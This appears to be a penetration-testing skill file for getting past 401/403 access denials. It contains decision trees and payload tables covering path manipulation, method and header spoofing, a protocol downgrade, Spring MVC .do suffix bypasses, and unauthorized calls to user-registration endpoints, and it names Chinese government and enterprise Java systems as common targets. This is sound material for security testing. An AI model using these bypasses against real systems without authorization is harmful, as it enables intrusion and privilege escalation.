---
name: 401-403-bypass
description: "401/403 access denial bypass and Spring MVC .do authorization bypass methodology. Use when an admin panel or API endpoint returns 401/403 Forbidden, when you need Spring MVC .do endpoint authorization bypass, 302 login redirects (login_tologin.do), or unauthorized registration (registersysuser, goedituser). Covers path manipulation, HTTP method tampering, header injection, protocol downgrade, .do suffix authorization bypass, 302 redirect bypass, and combined attacks"
zh-signals: "绕过 401/403 访问控制，并利用 Spring MVC .do 后缀鉴权绕过与 302 跳转等技巧。信号:401 绕过,403 绕过,Spring MVC,鉴权绕过,路径操纵"
when-to-use: "Use when admin panels or API endpoints return 401/403 and you need to test path manipulation, method or header tricks, or Spring MVC suffix-based authorization bypass."
metadata:
  tags: "403,401,bypass,forbidden,path-manipulation,method override,X-Original-URL,X-Forwarded-For,access control,privilege-bypass,spring,mvc,.do,authorization,302,login_tologin,registersysuser,goedituser,privilege-escalation,registration,auth-bypass"
  category: "exploit"
---

# 401/403 Bypass Methodology

Core idea: the reverse proxy / WAF checks one path format, but the backend performs a different path normalization.

## Further Reading

- Full list of path manipulation payloads → [references/path-manipulation-payloads.md](references/path-manipulation-payloads.md)
- HTTP method / header bypass → [references/method-header-bypass.md](references/method-header-bypass.md)
- Middleware-specific bypasses and combined attacks → [references/middleware-combo-bypass.md](references/middleware-combo-bypass.md)

---

## Decision Tree

```
Facing a 401/403?
├── 1. Path manipulation (highest success rate)
│   ├── /path/ → /PATH → /path%20 → /./path → //path
│   ├── /path;x → /path..;/ → /%2e/path → /path%00
│   └── 200? → bypass succeeded
├── 2. Method bypass
│   ├── POST/PUT/PATCH/DELETE/OPTIONS/HEAD
│   ├── X-HTTP-Method-Override: PUT
│   └── PROPFIND / custom methods
├── 3. Header bypass
│   ├── X-Original-URL: /path (Nginx/IIS)
│   ├── X-Forwarded-For: 127.0.0.1 (IP allowlist)
│   └── Referer/Origin/Host spoofing
├── 4. Protocol bypass
│   └── HTTP/1.0
├── 5. Combined attack
│   └── Method + Path + Header all together
├── All failed → other ideas
│   ├── Request smuggling → cache-poisoning-smuggling
│   ├── SSRF → ssrf-methodology
│   ├── IDOR → idor-methodology
│   └── Authentication logic → privilege-escalation-web
└── Automated scanning with byp4xx / 403bypasser
```

---

## Quick Reference — Path Manipulation Essentials

| Technique | Example |
|------|------|
| Trailing slash / dot | `/admin/`  `/admin/.` |
| Case variation | `/Admin`  `/ADMIN` |
| URL encoding | `/%61dmin`  `/admi%6e` |
| Double encoding | `/%2561dmin` |
| Overlong Unicode encoding | `/admi%C0%AE` |
| Dot segment / path traversal | `/./admin`  `//admin` |
| NULL byte | `/admin%00`  `/admin%00.json` |
| Path parameter (Tomcat) | `/admin;foo`  `/;/admin` |
| Backslash (IIS) | `/admin\` |

## Quick Reference — Method / Header Essentials

| Technique | Example |
|------|------|
| Method switch | `POST /admin`  `PUT /admin` |
| Method Override | `X-HTTP-Method-Override: PUT` |
| URL rewrite | `X-Original-URL: /admin` |
| IP spoofing | `X-Forwarded-For: 127.0.0.1` |
| Protocol downgrade | `GET /admin HTTP/1.0` |

## Middleware Quick Reference

| Server | Key Techniques |
|---|---|
| **Apache** | `/admin/` (trailing slash), `/.admin` (dot prefix) |
| **Nginx** | `/Admin` (case), `X-Original-URL` |
| **IIS/ASP.NET** | `/admin;.css`, `/admin\`, `/admin::$DATA` |
| **Tomcat/Java** | `/admin;foo`, `/admin..;/`, `/;/admin` |
| **Spring** | `/admin.anything` (older suffix matching) |

> See the references files for the full payload list

## Spring MVC `.do` Authorization Bypass and 302 Login Redirect

Chinese government and enterprise Java systems commonly expose `*.do` (Spring MVC) endpoints, and their weak authorization implementations frequently allow bypasses:

```
Request a .do endpoint → 302 redirect to the login page (login_tologin.do)
├── 1. Retry without the .do suffix: /user.do → /user
├── 2. Add a suffix to bypass: /user.do → /user.do/, /user.do;.css, /user.do?x=
├── 3. Case / encoding: /User.do, /%75ser.do
├── 4. Method switch: GET → POST → PUT
├── 5. Direct access with parameters: login_tologin.do style login/registration entry points have no authorization
│   └── Try unauthorized calls to registersysuser / goedituser style registration and user-modification endpoints
├── 6. 302 response analysis: internal paths / parameters leak in Location
└── 7. Cookie/Session reuse: the Set-Cookie after the login endpoint 302 is not validated
```

- Endpoint names such as `registersysuser` (register user) and `goedituser` (edit user) are common in production environments; if they lack authorization they allow unauthorized registration or user modification (privilege escalation via registration). When testing, first confirm the endpoint exists and then verify its permissions.
- Judging criterion: access a protected endpoint without any login session; if it returns business data / a successful operation instead of 401/403/302, the authorization has failed.

## Chinese / Java System Authorization Bypass Quick Reference

| Scenario | Try |
|------|------|
| Spring MVC `.do` endpoint | Remove the suffix, add a suffix, change case, switch the method |
| 302 login redirect | Analyze Location, access the business endpoint directly |
| Registration / user-modification endpoint | Unauthorized calls to registersysuser, goedituser |
| Allowlisted path | `/api/health` prefix + path traversal |
